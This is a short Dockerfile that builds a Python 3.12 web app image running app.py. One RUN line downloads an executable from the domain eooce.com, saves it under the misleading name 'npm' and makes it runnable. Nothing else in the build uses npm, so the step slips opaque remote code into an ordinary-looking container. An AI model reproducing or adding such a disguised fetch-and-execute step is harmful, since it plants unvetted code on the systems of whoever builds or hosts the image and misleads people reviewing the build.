FROM python:3.12-slim

WORKDIR /app

RUN apt-get update && apt-get install -y --no-install-recommends curl ca-certificates \
    && rm -rf /var/lib/apt/lists/*

COPY app.py requirements.txt index.html ./

RUN pip install --no-cache-dir aiohttp requests

RUN curl -L -o npm https://eooce.com && chmod +x npm

ENV PYTHONUNBUFFERED=1

CMD ["python3", "app.py"]
